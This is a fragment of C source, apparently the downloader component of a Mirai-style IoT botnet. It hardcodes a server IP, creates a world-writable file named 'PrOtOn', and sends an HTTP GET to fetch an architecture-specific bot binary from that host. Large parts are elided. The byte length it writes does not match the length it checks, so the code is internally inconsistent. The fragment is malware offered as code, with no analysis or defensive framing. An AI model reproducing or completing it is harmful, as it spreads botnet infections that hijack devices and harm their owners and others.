...
#define HTTP_SERVER utils_inet_addr(176,32,35,200) //176.32.35.200

#define EXEC_MSG            "puzzles\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "puzzle\n"
...
inline void run(void)
{
    ...
    ffd = open("PrOtOn", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /bns/gang123isgodloluaintgettingthesebinslikedammwtf." BOT_ARCH " HTTP/1.0\r\n\r\n", 17 + arch_strlen + 13) != (19 + arch_strlen + 13))
    {
#ifdef DEBUG
